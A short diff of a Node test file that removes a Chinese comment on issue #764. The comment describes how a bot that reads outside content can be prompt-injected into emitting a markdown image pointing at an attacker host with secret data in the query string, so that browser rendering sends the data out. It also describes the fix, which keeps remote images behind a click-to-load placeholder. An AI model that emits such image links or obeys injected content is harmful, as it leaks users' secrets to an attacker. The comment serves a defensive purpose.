@@ -1,7 +1,3 @@
-/**
- * #764：bot 讀外部內容，被 prompt injection 後只要輸出 `![](https://攻擊者/collect?d=機密)`，瀏覽器一渲染就替它送出去。
- * 遠端圖片預設不載入：先畫帶網域的佔位，使用者點了才載入。
- */
 import test from 'node:test'
 import assert from 'node:assert/strict'
 import { readFileSync } from 'node:fs'
